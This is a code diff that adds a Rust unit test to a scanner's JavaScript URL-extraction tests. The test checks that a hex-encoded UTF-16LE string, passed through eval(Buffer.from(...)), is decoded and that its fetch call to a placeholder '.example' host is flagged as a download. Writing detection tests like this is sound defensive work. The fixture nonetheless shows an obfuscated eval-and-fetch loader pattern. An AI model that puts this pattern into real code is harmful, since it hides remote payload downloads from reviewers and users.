@@ -14074,6 +14074,31 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_buffer_from_hex_utf16le_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://buffer-from-hex-utf16le-js.example/p')";
+        let encoded = payload
+            .encode_utf16()
+            .flat_map(u16::to_le_bytes)
+            .map(|byte| format!("{byte:02x}"))
+            .collect::<String>();
+        let js = format!(r#"var b = "{encoded}"; eval(Buffer.from(b, "hex").toString("utf16le"))"#)
+            .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://buffer-from-hex-utf16le-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS Buffer.from hex UTF-16LE payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_buffer_from_byte_array_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let payload = "fetch('https://buffer-from-byte-array-js.example/p')";
